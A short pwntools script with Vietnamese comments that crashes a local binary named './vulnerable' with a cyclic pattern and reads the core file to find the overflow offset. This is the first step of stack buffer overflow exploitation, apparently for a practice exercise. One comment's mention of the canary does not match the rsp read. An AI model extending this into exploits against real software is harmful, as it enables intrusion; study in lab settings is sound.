from pwn import *

# Tạo tiến trình chạy chương trình
io = process('./vulnerable')

# Tạo chuỗi chứa ký tự lặp để tìm khoảng cách đến canary
payload = cyclic(100)  # Tạo chuỗi lặp 100 ký tự

# Gửi chuỗi tới chương trình
io.sendline(payload)

# Nhận phản hồi (hoặc kiểm tra lỗi segfault)
io.wait()

# Kiểm tra chuỗi tràn bộ đệm đã ghi đè lên đâu
core = io.corefile
print(core.fault_addr)  # Địa chỉ lỗi bộ nhớ
print(core.read(core.rsp, 4))  # Đọc địa chỉ bị ghi đè

